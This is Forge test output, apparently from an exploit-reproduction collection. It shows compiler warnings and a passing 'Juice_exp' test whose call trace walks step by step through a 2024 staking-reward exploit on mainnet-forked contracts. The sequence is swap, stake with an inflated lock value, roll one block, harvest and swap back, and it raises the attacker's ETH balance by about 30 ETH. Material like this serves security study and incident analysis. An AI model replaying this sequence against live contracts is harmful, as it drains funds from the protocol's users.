Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.13s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-03/Juice_exp.sol:24:5:
   |
24 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2024-03/Juice_exp.sol:21:1:
   |
21 | contract Juice is Test {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
  --> src/test/2024-03/Juice_exp.sol:71:5:
   |
71 |     fallback() external payable {}
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20453)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20453] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 265.43ms (270.92µs CPU time)

Ran 1 test for src/test/2024-03/Juice_exp.sol:Juice
[PASS] testExploit() (gas: 463615)
Logs:
  [Start] Attacker ETH balance before exploit: 79228162514.264337593543950335
  [End] Attacker ETH Balance After exploit: 79228162544.350808320756466659

Traces:
  [548815] Juice::testExploit()
    ├─ emit log_named_decimal_uint(key: "[Start] Attacker ETH balance before exploit", val: 79228162514264337593543950335 [7.922e28], decimals: 18)
    ├─ [145236] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 500000000000000000}(0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae], Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1709964383 [1.709e9])
    │   ├─ [23974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 500000000000000000}()
    │   │   ├─ emit Deposit(dst: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 500000000000000000 [5e17])
    │   │   └─ ← [Stop] 
    │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C, 500000000000000000 [5e17])
    │   │   ├─ emit Transfer(from: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, to: 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C, value: 500000000000000000 [5e17])
    │   │   └─ ← [Return] true
    │   ├─ [2897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2504] 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C::getReserves() [staticcall]
    │   │   └─ ← [Return] 59231247621730093833 [5.923e19], 315102193452219849661269 [3.151e23], 1709964071 [1.709e9]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C) [staticcall]
    │   │   └─ ← [Return] 59731247621730093833 [5.973e19]
    │   ├─ [85319] 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C::swap(0, 2629819305963137449683 [2.629e21], Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [52565] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::transfer(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2629819305963137449683 [2.629e21])
    │   │   │   ├─ emit Transfer(from: 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C, to: 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae, value: 26298193059631374496 [2.629e19])
    │   │   │   ├─ emit Transfer(from: 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C, to: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2603521112903506075187 [2.603e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C) [staticcall]
    │   │   │   └─ ← [Return] 59731247621730093833 [5.973e19]
    │   │   ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C) [staticcall]
    │   │   │   └─ ← [Return] 312472374146256712211586 [3.124e23]
    │   │   ├─ emit Sync(reserve0: 59731247621730093833 [5.973e19], reserve1: 312472374146256712211586 [3.124e23])
    │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 500000000000000000 [5e17], amount1In: 0, amount0Out: 0, amount1Out: 2629819305963137449683 [2.629e21], to: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 2603521112903506075187 [2.603e21]
    │   └─ ← [Stop] 
    ├─ [25277] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::approve(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 2603521112903506075187 [2.603e21]
    ├─ [190810] 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e::stake(2603521112903506075187 [2.603e21], 3000000000 [3e9])
    │   ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 2603521112903506075187 [2.603e21]
    │   ├─ [25522] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::transferFrom(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e, 2603521112903506075187 [2.603e21])
    │   │   ├─ emit Transfer(from: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae, value: 0)
    │   │   ├─ emit Transfer(from: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e, value: 2603521112903506075187 [2.603e21])
    │   │   ├─ emit Approval(owner: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e, value: 115792089237316195423570985008687907853269984665640564036854062895009623564748 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ emit Stake(: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 2603521112903506075187 [2.603e21])
    │   └─ ← [Stop] 
    ├─ [0] VM::roll(19395637 [1.939e7])
    │   └─ ← [Return] 
    ├─ [0] VM::warp(1709964335 [1.709e9])
    │   └─ ← [Return] 
    ├─ [41716] 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e::harvest(0)
    │   ├─ [31430] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::transfer(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 332238461642082793241880 [3.322e23])
    │   │   ├─ emit Transfer(from: 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e, to: 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae, value: 0)
    │   │   ├─ emit Transfer(from: 0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e, to: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 332238461642082793241880 [3.322e23])
    │   │   └─ ← [Return] true
    │   ├─ emit Harvest(: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 332238461642082793241880 [3.322e23])
    │   └─ ← [Stop] 
    ├─ [25277] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::approve(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 332238461642082793241880 [3.322e23]
    ├─ [84406] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(332238461642082793241880 [3.322e23], 0, [0xdE5d2530A877871F6f0fc240b9fCE117246DaDae, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1709964395 [1.709e9])
    │   ├─ [21505] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::transferFrom(Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C, 332238461642082793241880 [3.322e23])
    │   │   ├─ emit Transfer(from: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae, value: 3322384616420827932418 [3.322e21])
    │   │   ├─ emit Transfer(from: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C, value: 328916077025661965309462 [3.289e23])
    │   │   ├─ emit Approval(owner: Juice: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 115792089237316195423570985008687907853269984665640563707219122365830336398055 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [504] 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C::getReserves() [staticcall]
    │   │   └─ ← [Return] 59731247621730093833 [5.973e19], 312472374146256712211586 [3.124e23], 1709964323 [1.709e9]
    │   ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C) [staticcall]
    │   │   └─ ← [Return] 641388451171918677521048 [6.413e23]
    │   ├─ [37516] 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C::swap(30586470727212516324 [3.058e19], 0, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 0x)
    │   │   ├─ [23162] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 30586470727212516324 [3.058e19])
    │   │   │   ├─ emit Transfer(from: 0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C, to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, value: 30586470727212516324 [3.058e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C) [staticcall]
    │   │   │   └─ ← [Return] 29144776894517577509 [2.914e19]
    │   │   ├─ [897] 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae::balanceOf(0xBa8381Ed6122829DaA46B0038d980d1c6e17CD7C) [staticcall]
    │   │   │   └─ ← [Return] 641388451171918677521048 [6.413e23]
    │   │   ├─ emit Sync(reserve0: 29144776894517577509 [2.914e19], reserve1: 641388451171918677521048 [6.413e23])
    │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 0, amount1In: 328916077025661965309462 [3.289e23], amount0Out: 30586470727212516324 [3.058e19], amount1Out: 0, to: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
    │   │   └─ ← [Stop] 
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) [staticcall]
    │   │   └─ ← [Return] 30586470727212516324 [3.058e19]
    │   ├─ [9223] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(30586470727212516324 [3.058e19])
    │   │   ├─ [83] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::fallback{value: 30586470727212516324}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit Withdrawal(src: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 30586470727212516324 [3.058e19])
    │   │   └─ ← [Stop] 
    │   ├─ [40] Juice::fallback{value: 30586470727212516324}()
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ emit log_named_decimal_uint(key: "[End] Attacker ETH Balance After exploit", val: 79228162544350808320756466659 [7.922e28], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.86s (2.33s CPU time)

Ran 2 test suites in 2.86s (3.13s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
